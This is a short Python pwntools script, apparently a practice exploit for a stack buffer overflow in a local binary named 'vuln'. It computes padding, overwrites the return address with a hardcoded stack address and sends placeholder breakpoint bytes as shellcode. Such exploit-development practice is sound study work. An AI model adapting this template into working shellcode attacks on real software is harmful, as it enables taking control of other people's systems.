from pwn import *
import struct

p = process("./vuln")

raw_input("gdb")

EIP = struct.pack('I', 0xffe9a080)
EIP = p32(0xff826cd0)
EIP = p32(0xfffb2930)
EIP = p32(0xFFFB2934)
padding = cyclic_find('waab') * 'A'
shellcode = '\xCC' * 64
p.sendline(padding + EIP + shellcode)
p.interactive()

